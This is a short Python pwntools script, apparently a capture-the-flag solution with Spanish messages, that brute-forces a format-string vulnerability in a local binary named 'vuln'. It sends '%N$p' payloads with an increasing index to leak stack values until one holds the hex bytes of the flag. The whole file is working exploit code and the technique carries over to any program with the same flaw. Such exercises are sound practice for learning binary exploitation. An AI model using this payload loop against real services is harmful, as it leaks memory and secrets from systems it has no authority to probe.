from pwn import *
import signal

def salir(a,v):
    print("\n\nSaliendo...")
    exit(1)

def exploit(c):
    with context.local(timeout = 2):
        context.log_level = 'error'
        with process("./vuln") as p:
            p.recvline()
            p.sendline(f"%{c}$p".encode())
            return p.recvlineS().rstrip()




FLAG = '67616c66' 
signal.signal(signal.SIGINT,salir)

if __name__ == '__main__':
    ELF("./vuln")
    found = False
    cont = 0
    with log.progress("Leaked Address") as progress:
        while not found:
            cont += 1
            try:
                addr = exploit(cont)
            except:
                progress.failure(f"%{cont}$p")
                exit(1)
            progress.status(addr)
            found = FLAG in addr
        progress.success()
